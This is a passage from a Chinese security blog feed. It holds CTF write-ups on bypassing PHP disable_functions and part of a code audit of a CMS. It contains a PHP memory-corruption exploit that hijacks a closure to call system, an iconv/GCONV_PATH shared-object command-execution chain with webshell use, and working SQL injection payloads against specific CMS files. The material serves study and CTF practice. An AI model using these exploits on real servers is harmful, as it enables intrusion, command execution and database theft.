class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Âíå‰∏äÈù¢‰∏ÄÊ†∑ÊääexpË¥¥ËøõÂéªÂ∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703190.png" alt="image-20231206170347121"><br>Âà©Áî®Êèí‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703964.png" alt="image-20231206170354905"></p><h2 id="Âà©Áî®iconv"><a href="#Âà©Áî®iconv" class="headerlink" title="Âà©Áî®iconv"></a>Âà©Áî®iconv</h2><h3 id="Âà©Áî®Êù°‰ª∂-11"><a href="#Âà©Áî®Êù°‰ª∂-11" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li><code>putenv</code></li><li><code>iconv</code></li><li>Â≠òÂú®ÂèØÂÜôÁöÑÁõÆÂΩï, ÈúÄË¶Å‰∏ä‰º† <code>.so</code> Êñá‰ª∂</li></ul><h3 id="Âà©Áî®ÂéüÁêÜ-2"><a href="#Âà©Áî®ÂéüÁêÜ-2" class="headerlink" title="Âà©Áî®ÂéüÁêÜ"></a>Âà©Áî®ÂéüÁêÜ</h3><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859?ops_request_misc=&request_id=&biz_id=102&utm_term=iconv%20%E7%BB%95%E8%BF%87%20disable_function&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117911859.pc_search_mgc_flag&spm=1018.2226.3001.4187">‰ΩøÁî®GCONV_PATH‰∏éiconvËøõË°åbypass disable_functions_gconv-modules_lesion__ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a></p><blockquote><p>iconvÊòØ‰∏Ä‰∏™ËÆ°ÁÆóÊú∫Á®ãÂ∫è‰ª•Âèä‰∏ÄÂ•óÂ∫îÁî®Á®ãÂ∫èÁºñÁ®ãÊé•Âè£ÁöÑÂêçÁß∞„ÄÇ ‰Ωú‰∏∫Â∫îÁî®Á®ãÂ∫èÁöÑiconvÈááÁî®ÂëΩ‰ª§Ë°åÁïåÈù¢ÔºåÂÖÅËÆ∏Â∞ÜÊüêÁßçÁâπÂÆöÁºñÁ†ÅÁöÑÊñá‰ª∂ËΩ¨Êç¢‰∏∫Âè¶‰∏ÄÁßçÁºñÁ†Å„ÄÇ</p></blockquote><p>ÊÑüËßâÂ∞±ÊòØËΩ¨Êç¢ÁºñÁ†ÅÁöÑ‰∏Ä‰∏™‰∏úË•øÂêßÔºåÂà©Áî®ÂéüÁêÜ‰πüÊòØÂíåLD_PRELOADÂ∑Æ‰∏çÂ§öÔºåÂèÇËÄÉ‰∏äÈù¢ÊñáÁ´†Âç≥ÂèØÔºåËøôÈáåÂÜçÊää‰∏äÈù¢ÊñáÁ´†‰∏≠ÁöÑbypassËøáÁ®ãË¥¥‰∏Ä‰∏ãÊñπ‰æø‰ª•ÂêéËá™Â∑±Áúã</p><blockquote><p>Êàë‰ª¨ÁöÑÂà©Áî®ÊñπÂºèÂ∞±ÊòØÈ¶ñÂÖàÂú®Êüê‰∏ÄÊñá‰ª∂Â§πÔºà‰∏ÄËà¨ÊòØ&#x2F;tmpÔºâ‰∏≠‰∏ä‰º†gconv-modulesÊñá‰ª∂ÔºåÊñá‰ª∂‰∏≠ÊåáÂÆöÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑÂ≠óÁ¨¶ÈõÜÊñá‰ª∂ÁöÑ.soÔºåÁÑ∂ÂêéÊàë‰ª¨ÂÜçÂú®.soÊñá‰ª∂‰∏≠ÁöÑgonv_init()ÂáΩÊï∞‰∏≠‰π¶ÂÜôÂëΩ‰ª§ÊâßË°åÂáΩÊï∞Ôºå‰πãÂêé‰∏ä‰º†phpÁöÑshellÔºåÂÜÖÂÆπÊòØ‰ΩøÁî®phpËÆæÂÆöGCONV_PATHÊåáÂêëÊàë‰ª¨ÁöÑgconv-modulesÊñá‰ª∂ÔºåÁÑ∂Âêé‰ΩøÁî®iconvÂáΩÊï∞‰ΩøÊàë‰ª¨ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÊâßË°å„ÄÇ</p></blockquote><h3 id="Âà©Áî®ÊñπÊ≥ï-6"><a href="#Âà©Áî®ÊñπÊ≥ï-6" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p>ÁéØÂ¢É‰ΩøÁî®ctfhub‰∏äÁöÑ<br>ÂÖà‰∏ä‰º†gconv-modulesÊñá‰ª∂‰∫é&#x2F;tmpÊñá‰ª∂Â§πÔºåÂÖ∂ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module  Ëá™ÂÆö‰πâÂ≠óÁ¨¶ÈõÜÂêçÂ≠óÔºàÂ§ßÂÜôÔºâ//    INTERNAL    ../../../../../../../../tmp/Ëá™ÂÆö‰πâÂ≠óÁ¨¶ÈõÜÂêçÂ≠óÔºàÂ∞èÂÜôÔºâ    2</span><br><span class="line">module  INTERNAL    Ëá™ÂÆö‰πâÂ≠óÁ¨¶ÈõÜÂêçÂ≠óÔºàÂ§ßÂÜôÔºâ//    ../../../../../../../../tmp/Ëá™ÂÆö‰πâÂ≠óÁ¨¶ÈõÜÂêçÂ≠óÔºàÂ∞èÂÜôÔºâ    2</span><br><span class="line"></span><br><span class="line">‰æãÂ¶ÇÔºö</span><br><span class="line">module  HACK//    INTERNAL    ../../../../../../../../tmp/hack    2</span><br><span class="line">module  INTERNAL    HACK//    ../../../../../../../../tmp/hack    2</span><br></pre></td></tr></table></figure><p>‰∏ä‰º†ËØ•Êñá‰ª∂Ëá≥&#x2F;tmpÊñá‰ª∂Â§π‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704195.png" alt="image-20231206170412144"><br>ÂÜçÁºñÂÜô‰∏Ä‰∏™.cÊñá‰ª∂Â¶Çhack.c</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv_init</span>() &#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁºñËØë‰∏∫.soÊñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>‰∏ä‰º†Âà∞tmp‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704267.png" alt="image-20231206170421215"><br>ÁÑ∂ÂêéÂú®webÁõÆÂΩï‰∏ãÁõ¥Êé•Âª∫‰∏™shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;hack&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704313.png" alt="image-20231206170429257"><br>ÁÑ∂ÂêéËÆøÈóÆÂç≥ÂèØÔºåÂõûËöÅÂâëÂú®tmp‰∏ãÁúãÂà∞flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704106.png" alt="image-20231206170436046"><br>‰πüÂèØÁõ¥Êé•Áî®ËöÅÂâëÁöÑÊèí‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704900.png" alt="image-20231206170442786"><br>ÊâßË°åÂêé‰ºöÂú®webÁõÆÂΩï‰∏ãÁîüÊàê‰∏™<code>.antproxy.php</code>ÁÑ∂ÂêéÁî®ÂêåÊ†∑ÁöÑÂØÜÁ†ÅËøûÊé•Ëøô‰∏™shellÂç≥ÂèØÊâßË°åÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704752.png" alt="image-20231206170458672"></p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://xz.aliyun.com/t/10057#toc-3">bypass disable_functionsÂßøÂäøÊÄªÁªì - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a><br><a href="https://cloud.tencent.com/developer/article/1524489">WindowsÂπ≥Âè∞ÁöÑPHP‰πãÂºÄÂêØCOMÈÖçÁΩÆ-ËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÁ§æÂå∫-ËÖæËÆØ‰∫ë (tencent.com)</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484214&idx=1&sn=0c00e6110d43ba82ac62296f808a119c&chksm=c0e63829f791b13f6561923d93725d070c0a0d27c48454d7fae47029d4e07596895421a0e47c&mpshare=1&scene=23&srcid=1115iVMa0GWptV9GZIyeuXEE&sharer_shareinfo=8fd12347e87a45e20619288ad6b14509&sharer_shareinfo_first=8fd12347e87a45e20619288ad6b14509#rd">‰ªéÁªïËøádisable_functionsÂà∞ÂÖ≥‰∫ésoÁöÑ‰∏Ä‰∫õÊÉ≥Ê≥ï (qq.com)</a><br><a href="https://blog.csdn.net/qq_51295677/article/details/124338635#:~:text=%E5%B7%A7%E7%94%A8mail%20%28%29%26LD_PRELOAD%E5%8A%AB%E6%8C%81%20%E5%9C%A8%E4%B8%8A%E7%AF%87das%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E6%8F%90%E5%88%B0%E8%BF%87%E5%88%B0%20mail%20%E5%87%BD%E6%95%B0%EF%BC%8C,mail%20%E5%87%BD%E6%95%B0%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E5%BD%93%E4%BD%BF%E7%94%A8%E5%88%B0%E8%BF%99%E7%8E%A9%E6%84%8F%E5%84%BF%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%20%2Fusr%2Fsbin%2Fsendmail%20%EF%BC%8C%E6%88%91%E4%BB%AC%E5%A6%82%E6%9E%9C%E8%83%BD%E5%8A%AB%E6%8C%81%E5%88%B0%20sendmail%20%E8%A7%A6%E5%8F%91%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%BE%E5%88%B0%E6%88%91%E4%BB%AC%E4%B9%8B%E5%89%8D%E8%AE%B2%E7%9A%84%E9%82%A3%E4%B8%AA%E7%9B%AE%E7%9A%84%E4%BA%86%E3%80%82">ÊµÖË∞àLD_PRELOADÂä´ÊåÅ_unset ld_preload_errorr0ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://www.freebuf.com/web/192052.html">Êó†ÈúÄsendmailÔºöÂ∑ßÁî®LD_PRELOADÁ™ÅÁ†¥disable_functions - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a><br><a href="https://www.cnblogs.com/leixiao-/p/10612798.html">LD_PRELOAD &amp; putenv() ÁªïËøá disable_functions &amp; open_basedir - Ê∑öÁ¨ë - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</a><br><a href="https://blog.csdn.net/weixin_63231007/article/details/129105223">PHP7.4 FFI Êâ©Â±ïÂÆâÂÖ®ÈóÆÈ¢ò_Ëë´Ëä¶Â®É42ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://cloud.tencent.com/developer/article/1838766">WebÂÆâÂÖ® | Fastcgi ÂçèËÆÆÂàÜÊûê‰∏é PHP-FPM ÊîªÂáªÊñπÊ≥ï-ËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÁ§æÂå∫-ËÖæËÆØ‰∫ë (tencent.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ê¢¶ÊÉ≥CMS 1.4‰ª£Á†ÅÂÆ°ËÆ°Â≠¶‰π†</title>
      <link href="/2023/08/%E6%A2%A6%E6%83%B3CMS-1-4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/%E6%A2%A6%E6%83%B3CMS-1-4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="‰∏Ä‰∫õÂÆ°ËÆ°ÊñπÊ≥ï"><a href="#‰∏Ä‰∫õÂÆ°ËÆ°ÊñπÊ≥ï" class="headerlink" title="‰∏Ä‰∫õÂÆ°ËÆ°ÊñπÊ≥ï"></a>‰∏Ä‰∫õÂÆ°ËÆ°ÊñπÊ≥ï</h2><p>ÂØπ‰∫éÊú™ÂÖ¨ÂºÄPOCÁöÑ1dayÂ§çÁé∞ÔºåÁõ¥Êé•ÁúãcnvdÁöÑÊèê‰∫§ÔºåÊàë‰ª¨ËøôÈáåÂÆ°ËÆ°Ê¢¶ÊÉ≥CMS 1.4ÊâÄ‰ª•Áõ¥Êé•ÊêúÁ¥¢Â∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158834.png" alt="image-20230828215700457"><br>ÂèØ‰ª•ÁúãÂà∞ÂæàÂ§öÔºåËôΩÁÑ∂Êñá‰ª∂ÂêçÊú™ÂÖ®ÈÉ®ÊòæÁ§∫‰ΩÜÊòØÂ∞±ÈÇ£Âá†‰∏™Êñá‰ª∂ÔºåÊòæÁ§∫‰∫ÜÂ§ßÈÉ®ÂàÜÂ≠óÊØçÂ∞±ËÉΩÊâæÂà∞‰∫ÜÔºåËøôÊòØÂ§çÁé∞1dayÁöÑÊñπÊ≥ïÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•Áõ¥Êé•ÊãøÊúÄÊñ∞ÁâàÊú¨ÂÆ°0day</p><h2 id="BookAction-class-php‰∏ãsqlÊ≥®ÂÖ•"><a href="#BookAction-class-php‰∏ãsqlÊ≥®ÂÖ•" class="headerlink" title="BookAction.class.php‰∏ãsqlÊ≥®ÂÖ•"></a>BookAction.class.php‰∏ãsqlÊ≥®ÂÖ•</h2><p>Ëøô‰∏™Á≥ªÁªüÊòØ‰∏™MVCÊû∂ÊûÑÔºåemmm‰∏çÂ§™‰∫ÜËß£ÂæóÊâæÊó∂Èó¥Â≠¶Â≠¶‰∫ÜÔºå‰∏çÁÑ∂‰ª£ÂÆ°ÊúâÁÇπÈöæÔºåÂÖàÊù•Áúã‰∏ãËøô‰∏™Êñá‰ª∂‰∏ãÁöÑÊ≥®ÂÖ•Âú®replyÊñπÊ≥ï‰∏ãGETÊé•Êî∂‰∏Ä‰∏™id<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158710.png" alt="image-20230828215835650"><br>Áõ¥Êé•Ë∑üËøõgetReplyÁúãÁúãÊâæÂà∞Â∫ïÂ±ÇÁöÑsqlËØ≠Âè•ÔºåÊúÄÁªàÂú®db.class.phpÊâæÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158745.png" alt="image-20230828215852668"><br>ÂèØ‰ª•ÁúãÂà∞Áõ¥Êé•ÊãºÊé•‰∫ÜfieldÂç≥‰∏ÄÂºÄÂßãÁöÑidÔºåËÄå‰∏îËøô‰∏™Êï¥‰∏™È°πÁõÆÁöÑsqlË∞ÉÁî®ÈÉΩÂú®Ëøô‰∏™Êñá‰ª∂Ôºå‰ΩÜÊòØËøô‰∏™Â∫ïÂ±ÇÁöÑsqlË∞ÉÁî®Ê≤°ÊúâÂÅöÈ¢ÑÁºñËØëÔºåÈÇ£‰πà‰Ω†Â∞±ÂæóÂú®Áî®ÁöÑÊó∂ÂÄôÂéªÂÜôËøôÊ†∑Â∞±ÂæàÂÆπÊòìÈÅóÊºèÂá∫Áé∞sqlÊ≥®ÂÖ•ÔºåÂú®ËøôÈáåÊâìÂç∞‰∏Ä‰∏ãsqlËØ≠Âè•Êñπ‰æøË∞ÉËØïÔºåÊù•Âà∞Ëøô‰∏™BookAction.class.phpÊñá‰ª∂‰∏ãËøõÂÖ•replyÊñπÊ≥ï‰º†‰∏™id<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159085.png" alt="image-20230828215908038"><br>Áõ¥Êé•Èó≠Âêà‰∏Ä‰∏ãÔºåËøôÈáåÂæóÁî®<code>)</code>Èó≠ÂêàÔºå‰ªésqlËØ≠Âè•Âç≥ÂèØÁúãÂá∫ÔºåÁÑ∂ÂêéÁî®Êä•ÈîôÊ≥®ÂÖ•Ê≥®‰∏Ä‰∏ãÁâàÊú¨ÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">or</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,version()),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>urlÁºñÁ†Å‰∏Ä‰∏ãÊ≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159837.png" alt="image-20230828215920773"><br>Ê≥®ÂÖ•ÊàêÂäüÔºåÂêéÂè∞ÁöÑÊ≥®ÂÖ•ËôΩÁÑ∂ÁÆÄÂçïÔºå‰ΩÜÊòØÂç±ÂÆ≥‰∏çÂ§ßÔºåÊ≤°ÊúâÂº±Âè£‰ª§ËøõÂÖ•ÂêéÂè∞ÁöÑËØùÂ∞±Êó†Ê≥ïÂà©Áî®Ôºå‰∏ãÈù¢ÁúãÁúãÂâçÂè∞ÁöÑsqlÊ≥®ÂÖ•ÔºåÂõ†‰∏∫sqlÊ≥®ÂÖ•Âü∫Êú¨‰∏äÂ∞±ÊòØÂú®ÂâçÂè∞Ê≥®ÊãøÂà∞ÂêéÂè∞ÁöÑÂØÜÁ†Å</p><h2 id="TagsAction-class-php‰∏ãÁöÑsqlÊ≥®ÂÖ•"><a href="#TagsAction-class-php‰∏ãÁöÑsqlÊ≥®ÂÖ•" class="headerlink" title="TagsAction.class.php‰∏ãÁöÑsqlÊ≥®ÂÖ•"></a>TagsAction.class.php‰∏ãÁöÑsqlÊ≥®ÂÖ•</h2><p>Êù•Âà∞ÂâçÂè∞index‰∏ãÁöÑTagsAction.class.phpÊñá‰ª∂ÔºåËøô‰∏™Êñá‰ª∂‰∏ãÊ≤°ÊúâËé∑ÂèñÂèÇÊï∞ÁöÑÊñπÊ≥ïÔºå‰ΩÜÊòØËøôÈáå‰ªñËá™Â∑±ÂÜô‰∫Ü‰∏™pÂáΩÊï∞Áî®Êù•Ëé∑ÂèñÔºåÂπ∂‰∏îÂØπsqlÊ≥®ÂÖ•ËøõË°å‰∫Ü‰∏Ä‰∏ãÂ§ÑÁêÜ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159964.png" alt="image-20230828215936884"><br>ÂèØ‰ª•ÁúãÂà∞selectÂíåfromÈÉΩËøáÊª§‰∫ÜÔºå‰ªéÈáåÈù¢ÁªïÊòØÂæàÂõ∞ÈöæÁöÑÔºåÂ∞±ÊÉ≥ÂäûÊ≥ï‰ªéÂ§ñÈÉ®ÁªïÔºåËøôÈáå‰∏∫‰∫ÜÈò≤È°µÈù¢Ë∑≥ËΩ¨Áõ¥Êé•Âú®burp‰∏äÊäìÂåÖÁúãÔºåÁÖßÊ†∑ÂéªÂà∞Â∫ïÈÉ®ÁöÑsqlË∞ÉÁî®ÊâìÂç∞‰∏Ä‰∏ãsqlËØ≠Âè•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159967.png" alt="image-20230828215956904"><br>Ê≠£Â∏∏Ê≥®ÂÖ•ÁöÑËØùÊòØ‰ºöË¢´ËøáÊª§ËΩ¨‰πâÁöÑÔºå‰ΩÜÊòØÁúã‰ª£Á†ÅÂú®Ëøá‰∫ÜpÂáΩÊï∞ÂêéËøõÂÖ•sqlËØ≠Âè•ÊâßË°åÂâçÊúâ‰∏™urlËß£Á†Å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200865.png" alt="image-20230828220011827"><br>emmmÔºåctfÁöÑÊÑüËßâÔºåÊêÅËøôÂÑøÂá∫È¢òÂë¢ÔºüÈÇ£‰πà‰∫åÊ¨°ÁºñÁ†ÅÂç≥ÂèØÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m<span class="operator">=</span>tags<span class="operator">&amp;</span>name<span class="operator">=</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">64</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span 